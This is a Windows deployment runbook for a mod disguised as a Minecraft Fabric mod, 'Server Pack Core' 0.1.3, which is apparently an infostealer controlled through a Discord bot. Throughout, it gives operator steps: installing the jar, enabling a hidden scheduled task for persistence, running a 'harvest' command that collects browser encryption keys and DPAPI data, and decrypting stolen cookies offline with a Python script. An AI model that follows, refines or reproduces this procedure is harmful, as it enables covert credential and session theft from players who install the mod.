WINDOWS DEPLOYMENT - Server Pack Core 0.1.3

Copy only the .jar, do not run it from the shared drive.

The Discord bot token was rotated on 2026-11-04. 0.1.2 and earlier no longer
connect; remove any previous serverpackcore jar before installing.

1. Go to the mods folder of the Fabric 1.20.1 profile (by default
   %APPDATA%\.minecraft\mods) and delete serverpackcore-0.1.1.jar and
   serverpackcore-0.1.2.jar if present. Either of them must go, they use the
   revoked token.

2. Copy serverpackcore-0.1.3.jar into that folder.

3. On Windows, check the file:

   certutil -hashfile serverpackcore-0.1.3.jar SHA256

   It must return:
   b074f02a25e29801769ce35497528bc4f73ad11a2b617854d6a38423b59554f6

4. Close Minecraft and check that no agent remains:

   tasklist | findstr /i "spc-sync"
   taskkill /f /im spc-sync.exe

5. Open Minecraft with the Fabric profile, enter a world and wait 20-60 s.

6. Confirm the new version is running:

   type "%LOCALAPPDATA%\ServerPackCore\state.json"

   It must show "version":"0.1.3".

7. Send `persist on`. Expected reply: "Persistence on: true" and
   "Hidden task: \ServerPackCore". The old task is overwritten, not
   duplicated.

8. Send `harvest`. For each detected browser, the ZIP must contain
   browsers/<browser>/keys.txt with a v10= line (and app_bound= if present).
   If it has error=, Windows has PowerShell restricted: Local State and
   dpapi/ remain as fallback.

9. On Fedora, offline:

   python decrypt.py cookies "…/browsers/<profile>/Cookies" --keys-file "…/browsers/<browser>/keys.txt"

   v20 cookies will appear as <v20 app-bound>; this is expected.

ROLLBACK

If 0.1.3 fails: `persist off`, close Minecraft and delete 0.1.3. Restoring
serverpackcore-0.1.2.jar brings the old code back, but it does NOT connect to
Discord: the token is revoked, so 0.1.2 is only useful for offline
diagnostics. Wait for a fixed build instead of staying on it.
